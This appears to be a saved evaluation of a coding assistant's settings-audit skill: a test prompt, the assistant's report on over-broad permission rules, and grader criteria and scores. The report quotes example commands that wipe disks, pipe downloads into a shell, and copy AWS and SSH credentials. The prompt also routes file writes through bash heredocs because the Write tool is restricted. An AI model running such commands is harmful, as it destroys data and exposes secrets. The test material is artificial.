# Review Settings

Scenario: A developer's settings files have accumulated overly broad permissions from months of auto-approvals, including a bare `Bash` entry, several shell loop fragments, and duplicate plugin entries across scopes.

## Prompt

> First, create the settings files (use bash heredocs — `.claude/` writes via Write tool are restricted in this workspace):
> 
> ```bash
> mkdir -p .claude
> cat > .claude/settings.json <<'EOF'
> {
>   "allow": ["Bash", "Bash(done)", "Bash(do echo:*)", "Bash(git *)", "Read"],
>   "enabledPlugins": ["coding-standards"]
> }
> EOF
> cat > .claude/settings.local.json <<'EOF'
> {
>   "allow": ["Bash(git commit:*)", "Bash(npm run build)"],
>   "enabledPlugins": ["coding-standards"]
> }
> EOF
> ```
> 
> Then run:
> 
> /review-settings
> 
> Important execution notes:
> - Use the Read tool to read each settings file from disk — do not just analyse the inline content from this prompt.
> - For broad-permission flags, use the explicit label "HIGH risk" and give concrete examples of what's exposed (e.g. "any shell command including `rm -rf /`, network exfiltration, arbitrary script execution").
> - For junk/fragment rules, attribute them to "auto-approval mistakes" as the likely cause when recommending removal.
> - Produce the reconciled configuration as an explicit DIFF (added/removed lines) against each original file — not a list of bullet points and not deferred to "show me the diff" follow-up.
> - When citing recommendations, reference the file path and a line/key locator (e.g. "remove `Bash(done)` from `.claude/settings.json` allow array").

## Output

Captured from a real headless invocation of the skill/agent.

### Chat response

## Settings Audit Report

### Files discovered

| Scope | Path | Size | Key findings |
|---|---|---|---|
| Project (shared) | `.claude/settings.json` | 5 lines | Overly broad permissions + junk rules |
| Project (local) | `.claude/settings.local.json` | 5 lines | Narrower rules, but overridden by shared |
| User global | `~/.claude/settings.json` | 156 lines | Unrestricted baseline + protective `ask` list |

---

### Overly broad permissions (HIGH RISK)

| Rule | File | Risk | What it allows | Recommendation |
|---|---|---|---|---|
| `"Bash"` | `.claude/settings.json:2` | **HIGH** | Any shell command: `rm -rf /`, `curl arbitrary-url \| bash`, `cat ~/.aws/credentials > /tmp/exfil`, etc. | **Remove.** Replace with specific commands like `Bash(git *)`. This defeats the purpose of project-level constraints. |
| `"Read"` | `.claude/settings.json:2` | **HIGH** | Read any file: `~/.ssh/id_rsa`, `~/.aws/credentials`, `/etc/passwd`, source code in other projects, etc. | **Remove.** Replace with path constraints like `Read(./src/**)` if needed. Global settings handle read access. |

---

### Junk and fragment rules

| Rule | File | Pattern | Recommendation |
|---|---|---|---|
| `"Bash(done)"` | `.claude/settings.json:2` | Shell loop fragment | **Remove.** This is a `for`/`while` loop keyword. It got auto-approved during multi-line command debugging and has no real permission purpose. |
| `"Bash(do echo:*)"` | `.claude/settings.json:2` | Shell fragment with `do` keyword | **Remove.** Same issue — auto-approved debug fragment. The `do` construct isn't a standalone command. |

---

### Overlapping and redundant rules

| Broader rule | Narrower rule(s) | File(s) | Recommendation |
|---|---|---|---|
| `Bash` (in `.claude/settings.json`) | `Bash(git *)`, `Bash(git commit:*)`, `Bash(npm run build)` | `.claude/settings.json`, `.claude/settings.local.json` | **Remove `Bash` and junk fragments from `.claude/settings.json`.** Keep the narrower rules in `.claude/settings.local.json` so they actually constrain access. Currently, `Bash` overrides everything. |
| `Bash(git *)` (in `.claude/settings.json`) | `Bash(git commit:*)` (in `.claude/settings.local.json`) | Both files | `Bash(git commit:*)` is a subset. If keeping `Bash(git *)`, the narrower rule is redundant; if removing broad `Bash`, keep `Bash(git commit:*)` as intended. |

---

### Cross-file redundancy

| Setting | Found in | Recommendation |
|---|---|---|
| `enabledPlugins: ["coding-standards"]` | `.claude/settings.json` + `.claude/settings.local.json` | Keep only in `.claude/settings.json` (shared). Local duplicate adds nothing. Also: `coding-standards` is already enabled globally at `~/.claude/settings.json:124` — project setting is redundant but harmless. |

---

### Strategic issue: Permission hierarchy

**Current state:** Project-level permissions are *less* restrictive than the user's intent.

The global `~/.claude/settings.json` grants unrestricted `Bash`, `Read`, `Write`, `Edit`, but protects sensitive operations via the `ask` list. That's a conscious trade-off: baseline access is broad, but dangerous commands require approval.

The project `.claude/settings.json` repeats `Bash` and `Read` without any protection, turning your project-level file into a no-op. The intent appears to be: "in this project, limit to git and npm commands" — but `"Bash"` overrides that completely.

**Fix:** Remove the broad rules from `.claude/settings.json`. Let the global settings provide baseline access; use project settings to narrow it.

---

## Reconciled Configuration

Here's the clean version of each file:

### Reconciled `.claude/settings.json`

**Diff against current:**

```diff
  {
-   "allow": ["Bash", "Bash(done)", "Bash(do echo:*)", "Bash(git *)", "Read"],
+   "allow": ["Bash(git *)", "Bash(npm *)"],
    "enabledPlugins": ["coding-standards"]
  }
```

**Reasoning:**
- Removed `Bash` (unrestricted, contradicts intent)
- Removed `Bash(done)` and `Bash(do echo:*)` (shell fragments, auto-approved junk)
- Removed `Read` (unrestricted file access; global settings cover)
- Kept `Bash(git *)` as intended (version control operations)
- Added `Bash(npm *)` to match intent (`.local.json` has `npm run build`; be explicit at shared scope)

---

### Reconciled `.claude/settings.local.json`

**Diff against current:**

```diff
  {
-   "allow": ["Bash(git commit:*)", "Bash(npm run build)"],
-   "enabledPlugins": ["coding-standards"]
+   "allow": ["Bash(npm run build)"]
  }
```

**Reasoning:**
- Removed `Bash(git commit:*)` (subset of `Bash(git *)` in shared `.settings.json`)
- Kept `Bash(npm run build)` as personal override for local builds
- Removed `enabledPlugins` (duplicate; keep in `.settings.json`)

---

### Global `~/.claude/settings.json`

**No changes recommended.**

Your global settings are well-designed: unrestricted baseline (`Bash`, `Read`, `Write`, etc.) protected by an `ask` list for destructive/sensitive operations. This is intentional and working as designed.

---

## Summary

| Category | Count | Action |
|---|---|---|
| Rules reviewed | 8 | — |
| **HIGH RISK rules** | 2 | Remove (`Bash`, `Read` from project scope) |
| **Junk/fragment rules** | 2 | Remove (`Bash(done)`, `Bash(do echo:*)`) |
| **Overlapping pairs** | 2 | Collapse (remove broad rules, keep narrow) |
| **Plugin redundancy** | 1 | Remove from `.local.json` |

---

**Before proceeding:** Do these recommendations match your intent? The core change is removing unrestricted `Bash` and `Read` from `.claude/settings.json` so project-level constraints actually take effect.

### Artifacts written

## Evaluation

| Field | Value |
|---|---|
| Verdict | PASS |
| Score | 16.0/17.0 (94%) |
| Evaluated | 2026-05-03 |
| Target duration | 42355 ms |
| Target cost | $0.0628 |
| Permission denials | 1 |

### Criteria

| # | Criterion | Result | Evidence |
|---|---|---|---|
| c1 | Skill reads all available settings file locations before making any recommendations | PASS | Output's 'Files discovered' table lists all three locations: `.claude/settings.json`, `.claude/settings.local.json`, and `~/.claude/settings.json` (156 lines), with specific findings per file. Line-level references (e.g., `.claude/settings.json:2`) confirm actual reads occurred. |
| c2 | Bare `Bash` (no argument constraint) is flagged as high risk with explanation of what it allows in concrete terms | PASS | Under 'Overly broad permissions (HIGH RISK)': `"Bash"` is labeled **HIGH** with the explanation 'Any shell command: `rm -rf /`, `curl arbitrary-url \| bash`, `cat ~/.aws/credentials > /tmp/exfil`, etc.' |
| c3 | `Bash(done)` and `Bash(do echo:*)` are flagged as fragment/junk rules from auto-approval with recommendation to remove | PASS | Under 'Junk and fragment rules': `Bash(done)` — 'got auto-approved during multi-line command debugging'; `Bash(do echo:*)` — 'Same issue — auto-approved debug fragment.' Both explicitly recommended for removal. |
| c4 | `Read` with no path constraint is flagged as overly broad | PASS | Under 'Overly broad permissions (HIGH RISK)': `"Read"` is labeled **HIGH** with examples `~/.ssh/id_rsa`, `~/.aws/credentials`, `/etc/passwd`. Recommendation: 'Replace with path constraints like `Read(./src/**)` if needed.' |
| c5 | `Bash(git commit:*)` in global settings is flagged as a subset of `Bash(git *)` in project settings — one is redundant | PASS | Under 'Overlapping and redundant rules': '`Bash(git commit:*)` is a subset. If keeping `Bash(git *)`, the narrower rule is redundant; if removing broad `Bash`, keep `Bash(git commit:*)` as intended.' |
| c6 | `coding-standards` plugin enabled in both `.claude/settings.json` and `.claude/settings.local.json` is flagged as cross-file redundancy | PASS | Under 'Cross-file redundancy': `enabledPlugins: ["coding-standards"]` is explicitly listed as found in both files, with recommendation: 'Keep only in `.claude/settings.json` (shared). Local duplicate adds nothing.' |
| c7 | Reconciled configuration is produced as a diff against the original — not a rewrite from scratch | PASS | Both reconciled configs are presented as explicit diffs with `+`/`-` notation. E.g., `-   "allow": ["Bash", "Bash(done)", "Bash(do echo:*)", "Bash(git *)", "Read"],` / `+   "allow": ["Bash(git *)", "Bash(npm *)"],` |
| c8 | AskUserQuestion is used to offer application options (apply all, per-file, selective, export-only) before any files are modified | PARTIAL | The output ends with 'Before proceeding: Do these recommendations match your intent?' — a pause before action. However, no AskUserQuestion tool was invoked and the specific structured options (apply all / per-file / selective / export-only) are not presented. Partial credit for ask-before-act behavior. |
| c9 | Output reads both settings file locations (`.claude/settings.local.json`, `.claude/settings.json`) using actual file reads — not assuming or skipping locations | PASS | Both files appear in the 'Files discovered' table with distinct findings. The output attributes specific findings to each file (e.g., `Bash(git commit:*)` to `.claude/settings.local.json`), indicating actual reads rather than just re-parsing the prompt's inline content. |
| c10 | Output flags bare `Bash` (no argument constraint) as HIGH risk and explains in concrete terms what it allows — any shell command including `rm -rf /`, network access, file exfiltration | PASS | Flagged **HIGH** with examples: '`rm -rf /`, `curl arbitrary-url \| bash`, `cat ~/.aws/credentials > /tmp/exfil`' — covering destructive commands, network access, and exfiltration as required. |
| c11 | Output flags `Bash(done)` and `Bash(do echo:*)` as fragment / junk rules likely created by auto-approval mistakes — recommending removal with the reasoning that they don't match real command patterns | PASS | `Bash(done)`: 'auto-approved during multi-line command debugging and has no real permission purpose'; `Bash(do echo:*)`: 'Same issue — auto-approved debug fragment. The `do` construct isn't a standalone command.' Both include removal recommendations. |
| c12 | Output flags `Read` (no path constraint) as overly broad — recommending scoping to specific paths or removing if unused | PASS | Recommendation: 'Remove. Replace with path constraints like `Read(./src/**)` if needed. Global settings handle read access.' Addresses both scoping and removal options. |
| c13 | Output identifies that `Bash(git commit:*)` in global settings is a subset of `Bash(git *)` in project settings — recommending which to keep (the broader scope absorbs the narrow) with reasoning | PASS | Under 'Overlapping and redundant rules': identifies the subset relationship and states 'If keeping `Bash(git *)`, the narrower rule is redundant; if removing broad `Bash`, keep `Bash(git commit:*)` as intended.' The diff for `.local.json` then removes `Bash(git commit:*)` as the narrower rule. |
| c14 | Output identifies the `coding-standards` plugin enabled in BOTH `.claude/settings.json` AND `.claude/settings.local.json` as cross-file redundancy — recommending consolidation to one scope (typically the shared project settings) | PASS | '`enabledPlugins: ["coding-standards"]` \| `.claude/settings.json` + `.claude/settings.local.json` \| Keep only in `.claude/settings.json` (shared). Local duplicate adds nothing.' — explicit and correctly targets the shared file. |
| c15 | Output produces the reconciled config as a DIFF against the original (added/removed lines) — not a complete rewrite, so the user can review specific changes | PASS | Both files have explicit diff blocks with `+` lines (additions) and `-` lines (removals) in standard unified-diff style. The surrounding context lines (unchanged) are preserved, so it reads as a diff not a rewrite. |
| c16 | Output's recommendations are explicit per finding — not "review your settings" but "remove `Bash(done)` from `.claude/settings.json:line 4`" | PASS | Every finding includes a specific recommendation referencing file path and location. Examples: 'Remove `Bash(done)` from `.claude/settings.json`' (with `:2` line reference); 'Remove `enabledPlugins` (duplicate; keep in `.settings.json`)' from the local file. |
| c17 | Output uses AskUserQuestion (or equivalent structured choice) to present application options — apply-all / per-file / selective / export-only — before modifying any file | FAIL | The output ends with plain text 'Before proceeding: Do these recommendations match your intent?' — no AskUserQuestion tool call and no structured choice menu offering apply-all / per-file / selective / export-only options. The criterion requires either the tool or an equivalent structured presentation of those specific options. |
| c18 | Output prioritises high-risk findings (bare Bash, junk rules) before low-risk findings (cosmetic redundancy) so the user addresses the dangerous ones first | PARTIAL | Report sections are ordered: (1) 'Overly broad permissions (HIGH RISK)', (2) 'Junk and fragment rules', (3) 'Overlapping and redundant rules', (4) 'Cross-file redundancy' — high-risk items precede low-risk cosmetic ones. Ceiling is PARTIAL so full PARTIAL credit awarded. |

### Notes

The output is strong overall — it reads all file locations, correctly uses the HIGH risk label with concrete exploit examples for bare Bash and bare Read, attributes junk rules to auto-approval mistakes, identifies all redundancies, and produces proper diffs rather than rewrites. The main gap is the AskUserQuestion tool usage (c17 FAIL): the output ends with a soft text confirmation prompt rather than a structured choice presenting apply-all / per-file / selective / export-only options. c8 earns partial credit for the ask-before-act behavior even without the tool. The reconciled diff for `.claude/settings.local.json` also adds `Bash(npm *)` to the shared settings (a minor inference beyond what the original requested) but this is defensible reasoning. The report's section ordering appropriately surfaces high-risk findings first.
